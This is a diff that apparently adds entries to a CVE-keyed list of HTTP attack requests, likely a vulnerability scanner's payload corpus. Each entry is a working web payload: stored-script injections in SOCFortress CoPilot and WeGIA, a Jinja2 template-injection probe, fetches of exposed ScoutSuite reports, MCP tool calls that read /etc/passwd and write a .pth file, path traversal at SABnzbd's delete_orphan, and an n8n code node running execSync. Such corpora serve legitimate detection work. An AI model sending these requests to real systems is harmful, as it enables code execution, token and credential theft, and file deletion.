@@ -5006,3 +5006,30 @@ POST /server/index.php?s=/api/mock/add header="Content-Type: application/x-www-f
 #     Code nodes run JavaScript in the main process outside the task runner. ---
 POST /rest/workflows header="Content-Type: application/json" body="{\"name\":\"x\",\"nodes\":[{\"name\":\"Code\",\"type\":\"n8n-nodes-base.function\",\"parameters\":{\"functionCode\":\"return process.mainModule.require('child_process').execSync('id').toString();\"}}],\"connections\":{}}"
 PATCH /rest/workflows/abc123 header="Content-Type: application/json" body="{\"nodes\":[{\"name\":\"Code\",\"type\":\"n8n-nodes-base.functionItem\",\"parameters\":{\"jsCode\":\"return 1;\"}}]}"
+
+# --- CVE-2026-61728 (SOCFortress CoPilot): alert comment markup is rendered
+#     through v-html, so stored script steals the portal access tokens. ---
+POST /api/incidents/db_operations/alert/comment header="Content-Type: application/json" body="{\"alert_id\":1,\"comment\":\"<script>fetch('/auth/refresh')</script>\"}"
+
+# --- CVE-2026-61719 (WeGIA): textoProntuario is stored and rendered without
+#     sanitization on the patient history page. ---
+POST /controle/control.php header="Content-Type: application/x-www-form-urlencoded" body="nomeClasse=SaudeControle&metodo=alterarProntuario&id_fichamedica=1&textoProntuario=<script>alert(document.cookie)</script>"
+
+# --- CVE-2026-61707 (SOCFortress CoPilot): uploaded case-report templates are
+#     rendered by a non-sandboxed Jinja2 environment. ---
+POST /case-report-template/upload header="Content-Type: application/x-www-form-urlencoded" body="name=report&template={{7*7}}"
+
+# --- CVE-2026-61730 (SOCFortress CoPilot): the public /scoutsuite-report
+#     static mount exposes generated reports and an uploaded GCP key. ---
+GET /scoutsuite-report/scoutsuite-results/scoutsuite_results_default.js
+GET /scoutsuite-report/report.html
+
+# --- CVE-2026-120338 (Prefab UI): the generate_prefab_ui MCP tool runs caller
+#     Python in a Deno subprocess that keeps read/write permissions. ---
+POST /mcp header="Content-Type: application/json" body="{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/call\",\"params\":{\"name\":\"generate_prefab_ui\",\"arguments\":{\"code\":\"import js; js.Deno.readTextFileSync('/etc/passwd')\"}}}"
+POST /mcp header="Content-Type: application/json" body="{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"generate_prefab_ui\",\"arguments\":{\"code\":\"from js import Deno; Deno.writeTextFileSync('/tmp/pwn.pth','import os')\"}}}"
+
+# --- CVE-2026-62965 (SABnzbd): delete_orphan joins the value parameter onto
+#     the download directory without confinement; a traversal escapes it. ---
+GET /api?mode=status&name=delete_orphan&value=../../config/sabnzbd.ini
+GET /api?mode=status&name=delete_orphan&value=..%2F..%2Fconfig%2Fsabnzbd.ini
